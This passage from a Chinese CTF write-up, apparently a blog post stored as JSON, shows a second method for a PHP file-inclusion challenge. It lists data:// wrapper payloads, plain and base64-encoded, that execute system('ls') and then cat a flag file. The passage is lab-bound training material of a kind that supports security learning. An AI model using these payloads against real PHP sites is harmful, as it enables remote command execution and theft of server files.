start=\"2\">\n<li>方法二：</li>\n</ol>\n<p><img data-src=\"/img/webpic/image-20230824235157008.png\" alt=\"image-20230824235157008\"></p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">data</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//text/plain,&lt;?php system(\"ls\")?></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">data</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=   //推荐</span></span></pre></td></tr></table></figure><p>都可以</p>\n<p><img data-src=\"/img/webpic/image-20230824235301184.png\" alt=\"image-20230824235301184\"></p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">data</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//text/plain,&lt;?php system(\"cat fl4gisisish3r3.php\")?></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">data</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==   //推荐</span></span></pre></td></tr></table></figure>",
            "tags": [
                "wp"
            ]
        }
    ]
}